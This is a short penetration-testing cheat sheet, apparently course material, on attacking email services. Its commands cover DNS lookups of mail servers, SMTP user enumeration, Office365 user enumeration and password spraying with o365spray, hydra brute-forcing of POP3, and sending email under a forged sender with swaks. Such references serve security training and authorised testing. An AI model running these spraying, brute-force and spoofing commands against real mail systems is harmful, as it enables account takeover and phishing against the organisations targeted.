# Attacking Email Services

| Command                                                                                     | Description                                                                      |
| ------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| ```host -t MX microsoft.com```                                                                  | DNS lookup for mail servers for the specified domain.                            |
| ```dig mx example.com \| grep "MX" \| grep -v ";"```                                     | DNS lookup for mail servers for the specified domain.                            |
| ```host -t A mail1.example.com.```                                                        | DNS lookup of the IPv4 address for the specified subdomain.                      |
| ```telnet $TARGET_IP 25```                                                                    | Connect to the SMTP server.                                                      |
| ```smtp-user-enum -M RCPT -U userlist.txt -D example.com -t $TARGET_IP```               | SMTP user enumeration using the RCPT command against the specified host.         |
| ```python3 o365spray.py --validate --domain msplaintext.xyz```                                  | Verify the usage of Office365 for the specified domain.                          |
| ```python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz```                         | Enumerate existing users using Office365 on the specified domain.                |
| ```python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz``` | Password spraying against a list of users that use Office365 for the specified domain. |
| ```hydra -L users.txt -p 'Company01!' -f $TARGET_IP pop3```                                   | Brute-forcing the POP3 service.                                                  |
| ```swaks --from notifications@example.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server $TARGET_IP``` | Send email using SWAKS (Swiss Army Knife for SMTP).                               |

